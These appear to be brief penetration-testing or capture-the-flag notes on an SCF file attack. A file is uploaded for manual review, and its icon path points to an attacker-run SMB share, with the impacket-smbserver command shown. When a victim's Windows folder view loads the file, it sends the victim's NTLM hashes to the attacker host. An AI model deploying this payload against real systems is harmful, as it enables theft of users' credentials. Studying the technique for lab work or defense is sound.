____

Team will review the uploads manually 

https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

```scf
[Shell]
Command=2
IconFile=\\10.10.14.10\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```


```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```
